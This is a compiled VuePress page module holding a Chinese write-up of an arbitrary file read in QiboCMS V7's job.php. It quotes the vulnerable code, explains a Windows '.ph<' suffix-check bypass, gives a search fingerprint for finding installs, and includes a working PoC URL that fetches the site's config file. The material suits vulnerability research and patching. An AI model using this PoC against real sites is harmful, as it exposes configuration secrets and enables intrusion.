import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const d={},l=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>QiboCMS V7版本/do/job.php页面URL参数过滤不严，导致可以下载系统任意文件，获取系统敏感信息。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>齐博CMS V7
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;齐博软件-v7&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>漏洞分析 <code>/inc/job/download.php</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$url=trim(base64_decode($url));
    $fileurl=str_replace($webdb[www_url],&quot;&quot;,$url);
    if( eregi(&quot;.php&quot;,$fileurl) &amp;&amp; is_file(ROOT_PATH.&quot;$fileurl&quot;) ){
        die(&quot;ERR&quot;);
    }

    if(!$webdb[DownLoad_readfile]){
        $fileurl=strstr($url,&quot;://&quot;)?$url:tempdir($fileurl);
        header(&quot;location:$fileurl&quot;);
        exit;
    }


    $webdb[upfileType] = str_replace(&#39; &#39;,&#39;|&#39;,$webdb[upfileType]);
    if( $webdb[local_download] &amp;&amp; is_file(ROOT_PATH.$fileurl) &amp;&amp; eregi(&quot;($webdb[upfileType])$&quot;,$fileurl) ){
        $filename=basename($fileurl);
        $filetype=substr(strrchr($filename,&#39;.&#39;),1);
        $_filename=preg_replace(&quot;/([\\d]+)_(200[\\d]+)_([^_]+)\\.([^\\.]+)/is&quot;,&quot;\\\\3&quot;,$filename);

        if(eregi(&quot;^([a-z0-9=]+)$&quot;,$_filename)&amp;&amp;!eregi(&quot;(jpg|gif|png)$&quot;,$filename)){
            $filename=urldecode(base64_decode($_filename)).&quot;.$filetype&quot;;
        }
        ob_end_clean();
        header(&#39;Last-Modified: &#39;.gmdate(&#39;D, d M Y H:i:s&#39;,time()).&#39; GMT&#39;);
        header(&#39;Pragma: no-cache&#39;);
        header(&#39;Content-Encoding: none&#39;);
        header(&#39;Content-Disposition: attachment; filename=&#39;.$filename);
        header(&#39;Content-type: &#39;.$filetype);
        header(&#39;Content-Length: &#39;.filesize(ROOT_PATH.&quot;$fileurl&quot;));
        readfile(ROOT_PATH.&quot;$fileurl&quot;);
        exit;
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>url base64解码,匹配后缀 如果是php结尾的就退出 在windows下能用xxx.ph&lt; 绕过 然后经过一系列的正则后会下载文件。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>if( eregi(&quot;.php&quot;,$fileurl) &amp;&amp; is_file(ROOT_PATH.&quot;$fileurl&quot;) ){
        die(&quot;ERR&quot;);
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/do/job.php?job=download&amp;url=ZGF0YS9jb25maWcucGg8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181609962.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),s=[l];function r(t,u){return i(),n("div",null,s)}const v=e(d,[["render",r],["__file","齐博CMS V7 job.php 任意文件读取漏洞.html.vue"]]);export{v as default};
